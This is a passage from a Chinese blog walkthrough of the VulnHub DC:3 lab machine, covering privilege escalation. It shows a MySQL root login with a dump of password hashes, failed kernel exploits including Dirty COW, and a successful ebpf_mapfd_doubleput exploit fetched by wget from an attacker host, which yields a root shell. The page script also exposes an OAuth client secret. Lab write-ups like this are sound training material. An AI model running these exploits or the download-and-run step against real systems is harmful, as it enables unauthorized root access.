class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/home/dc3$ mysql -uroot -p<br>mysql -uroot -p<br>Enter password: squires<br><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 3631<br>Server version: 5.7.25-0ubuntu0.16.04.2 (Ubuntu)<br><br>Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; show databases;<br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| joomladb           |<br>| mysql              |<br>| performance_schema |<br>| sys                |<br>+--------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; use mysql;<br>use mysql;<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; show tables;<br>show tables;<br>+---------------------------+<br>| Tables_in_mysql           |<br>+---------------------------+<br>| columns_priv              |<br>| db                        |<br>| engine_cost               |<br>| event                     |<br>| func                      |<br>| general_log               |<br>| gtid_executed             |<br>| help_category             |<br>| help_keyword              |<br>| help_relation             |<br>| help_topic                |<br>| innodb_index_stats        |<br>| innodb_table_stats        |<br>| ndb_binlog_index          |<br>| plugin                    |<br>| proc                      |<br>| procs_priv                |<br>| proxies_priv              |<br>| server_cost               |<br>| servers                   |<br>| slave_master_info         |<br>| slave_relay_log_info      |<br>| slave_worker_info         |<br>| slow_log                  |<br>| tables_priv               |<br>| time_zone                 |<br>| time_zone_leap_second     |<br>| time_zone_name            |<br>| time_zone_transition      |<br>| time_zone_transition_type |<br>| user                      |<br>+---------------------------+<br>31 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure>

<p>这里用\g是为了将结果旋转90度显示，方便我们查看列名，不旋转易读性很差。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> * from user\g;<br><span class="hljs-keyword">select</span> * from user\g;<br>+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+<br>| Host      | User             | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | password_last_changed | password_lifetime | account_locked |<br>+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+<br>| localhost | root             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *BFD14C8A23EF160EED3D54E16D4F5311264D0963 | N                | 2019-03-23 19:31:20   |              NULL | N              |<br>| localhost | mysql.sys        | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2019-03-25 13:47:43   |              NULL | Y              |<br>| localhost | debian-sys-maint | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *0640482736E7906211AEA47971B6C8478BA7DB4D | N                | 2019-03-23 19:16:41   |              NULL | N              |<br>| localhost | mysql.session    | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | Y          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2019-03-25 13:47:42   |              NULL | Y              |<br>+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>ERROR: <br>No query specified<br></code></pre></td></tr></table></figure>

<p>我们对<code>User,authentication_string</code>这两个列比较感兴趣，查一下。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">User</span>,authentication_string <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">User</span>,authentication_string <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">User</span>             <span class="hljs-operator">|</span> authentication_string                     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------------------------------------------+</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> <span class="hljs-operator">*</span>BFD14C8A23EF160EED3D54E16D4F5311264D0963 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.sys        <span class="hljs-operator">|</span> <span class="hljs-operator">*</span>THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> debian<span class="hljs-operator">-</span>sys<span class="hljs-operator">-</span>maint <span class="hljs-operator">|</span> <span class="hljs-operator">*</span><span class="hljs-number">0640482736E7906211</span>AEA47971B6C8478BA7DB4D <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.session    <span class="hljs-operator">|</span> <span class="hljs-operator">*</span>THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------------------------------------------+</span><br><span class="hljs-number">4</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>

<p>这里作者提示了<code>THIS IS NOT AVALID PASSWORD THAT CAN BE USED HERE</code>，说明是无关的信息。那就说明这条路也到头了。</p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>事已至此，手动列举没有发现什么quick win，那只能回归简单粗暴了。</p>
<p>先试试脏牛：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/tmp/test$ gcc -pthread 40839.c -o dirty -lcrypt<br>gcc -pthread 40839.c -o dirty -lcrypt<br>www-data@DC-3:/tmp/test$ ./dirty<br>./dirty<br>Please enter the new password: password<br><br></code></pre></td></tr></table></figure>

<p>没反应了，看看虚拟机发现已经寄了。脏牛成功弄崩了。</p>
<p>所以说这就是不要第一步就内核提权的原因，很有可能把机子干趴了。</p>
<p>试了几个别的：<code>40049.c,40839.c,40871.c,42033.txt,44300.c,45010.c</code>都没成功。</p>
<p>直到试到了<code>ebpf_mapfd_doubleput</code>才成功。按照其说明操作即可（编译有warning也不影响）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/tmp/test$ wget 192.168.56.144:8000/exploit.tar<br>wget 192.168.56.144:8000/exploit.tar<br>--2023-05-31 19:14:40--  http://192.168.56.144:8000/exploit.tar<br>Connecting to 192.168.56.144:8000... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 20480 (20K) [application/x-tar]<br>Saving to: <span class="hljs-string">&#x27;exploit.tar&#x27;</span><br><br>     0K .......... ..........                                 100% 35.8M=0.001s<br><br>2023-05-31 19:14:40 (35.8 MB/s) - <span class="hljs-string">&#x27;exploit.tar&#x27;</span> saved [20480/20480]<br><br>www-data@DC-3:/tmp/test$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 64<br>drwxr-xr-x 2 www-data www-data  4096 May 31 19:14 .<br>drwxrwxrwt 9 root     root      4096 May 31 19:09 ..<br>-rw-r--r-- 1 www-data www-data 13176 May 31 19:06 45010.c<br>-rwxr-xr-x 1 www-data www-data 16764 May 31 19:09 exp<br>-rw-r--r-- 1 www-data www-data 20480 Aug 16  2016 exploit.tar<br>www-data@DC-3:/tmp/test$ tar xvf exploi<br>tar xvf exploit.tar <br>ebpf_mapfd_doubleput_exploit/<br>ebpf_mapfd_doubleput_exploit/hello.c<br>ebpf_mapfd_doubleput_exploit/suidhelper.c<br>ebpf_mapfd_doubleput_exploit/compile.sh<br>ebpf_mapfd_doubleput_exploit/doubleput.c<br>www-data@DC-3:/tmp/test$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>45010.c<br>ebpf_mapfd_doubleput_exploit<br>exp<br>exploit.tar<br>www-data@DC-3:/tmp/test$ <span class="hljs-built_in">cd</span> ebpf<br><span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit/<br>www-data@DC-3:/tmp/test/ebpf_mapfd_doubleput_exploit$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-x--- 2 www-data www-data 4096 Apr 26  2016 .<br>drwxr-xr-x 3 www-data www-data 4096 May 31 19:14 ..<br>-rwxr-x--- 1 www-data www-data  155 Apr 26  2016 compile.sh<br>-rw-r----- 1 www-data www-data 4188 Apr 26  2016 doubleput.c<br>-rw-r----- 1 www-data www-data 2186 Apr 26  2016 hello.c<br>-rw-r----- 1 www-data www-data  255 Apr 26  2016 suidhelper.c<br>www-data@DC-3:/tmp/test/ebpf_mapfd_doubleput_exploit$ ./comp    <br>./compile.sh <br>doubleput.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;make_setuid&#x27;</span>:<br>doubleput.c:91:13: warning: cast from pointer to <span class="hljs-built_in">integer</span> of different size [-Wpointer-to-int-cast]<br>    .insns = (__aligned_u64) insns,<br>             ^<br>doubleput.c:92:15: warning: cast from pointer to <span class="hljs-built_in">integer</span> of different size [-Wpointer-to-int-cast]<br>    .license = (__aligned_u64)<span class="hljs-string">&quot;&quot;</span><br>               ^<br>www-data@DC-3:/tmp/test/ebpf_mapfd_doubleput_exploit$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 60<br>drwxr-x--- 2 www-data www-data  4096 May 31 19:15 .<br>drwxr-xr-x 3 www-data www-data  4096 May 31 19:14 ..<br>-rwxr-x--- 1 www-data www-data   155 Apr 26  2016 compile.sh<br>-rwxr-xr-x 1 www-data www-data 12336 May 31 19:15 doubleput<br>-rw-r----- 1 www-data www-data  4188 Apr 26  2016 doubleput.c<br>-rwxr-xr-x 1 www-data www-data  8028 May 31 19:15 hello<br>-rw-r----- 1 www-data www-data  2186 Apr 26  2016 hello.c<br>-rwxr-xr-x 1 www-data www-data  7524 May 31 19:15 suidhelper<br>-rw-r----- 1 www-data www-data   255 Apr 26  2016 suidhelper.c<br>www-data@DC-3:/tmp/test/ebpf_mapfd_doubleput_exploit$ ./doubleput<br>./doubleput<br>starting writev<br>woohoo, got pointer reuse<br>writev returned successfully. <span class="hljs-keyword">if</span> this worked, you<span class="hljs-string">&#x27;ll have a root shell in &lt;=60 seconds.</span><br><span class="hljs-string">suid file detected, launching rootshell...</span><br><span class="hljs-string">we have root privs now...</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br><span class="hljs-string">whoami</span><br><span class="hljs-string">root</span><br><span class="hljs-string">cd /root</span><br><span class="hljs-string">ls -la</span><br><span class="hljs-string">total 28</span><br><span class="hljs-string">drwx------  2 root root 4096 Apr 25  2020 .</span><br><span class="hljs-string">drwxr-xr-x 22 root root 4096 Mar 23  2019 ..</span><br><span class="hljs-string">-rw-------  1 root root 1202 Apr 25  2020 .bash_history</span><br><span class="hljs-string">-rw-r--r--  1 root root 3106 Oct 23  2015 .bashrc</span><br><span class="hljs-string">-rw-------  1 root root   71 Mar 23  2019 .mysql_history</span><br><span class="hljs-string">-rw-r--r--  1 root root  148 Aug 18  2015 .profile</span><br><span class="hljs-string">-rw-------  1 root root    0 Apr 25  2020 .viminfo</span><br><span class="hljs-string">-rw-r--r--  1 root root  604 Mar 26  2019 the-flag.txt</span><br><span class="hljs-string">cat the-flag.txt</span><br><span class="hljs-string"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="hljs-string"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="hljs-string">  \ \ /\ / / _ \ | | | | | |/ _ \| &#x27;</span>_ \ / _ \ | | | |<br>   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|<br>    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)<br>                                                     <br><br>Congratulations are <span class="hljs-keyword">in</span> order.  :-)<br><br>I hope you<span class="hljs-string">&#x27;ve enjoyed this challenge as I enjoyed making it.</span><br><span class="hljs-string"></span><br><span class="hljs-string">If there are any ways that I can improve these little challenges,</span><br><span class="hljs-string">please let me know.</span><br><span class="hljs-string"></span><br><span class="hljs-string">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="hljs-string"></span><br><span class="hljs-string">Have a great day!!!!</span><br></code></pre></td></tr></table></figure>

<p>成功提权。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/28/DC-2/">[vulnhub]  DC:2 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-3"><span class="toc-number">1.</span> <span class="toc-text">DC:3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMAP"><span class="toc-number">1.3.1.</span> <span class="toc-text">SQLMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Joomblah"><span class="toc-number">1.3.2.</span> <span class="toc-text">Joomblah</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">1.3.3.</span> <span class="toc-text">破解哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0get-shell"><span class="toc-number">1.3.4.</span> <span class="toc-text">后台get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.4.1.</span> <span class="toc-text">手动枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.2.</span> <span class="toc-text">内核提权</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>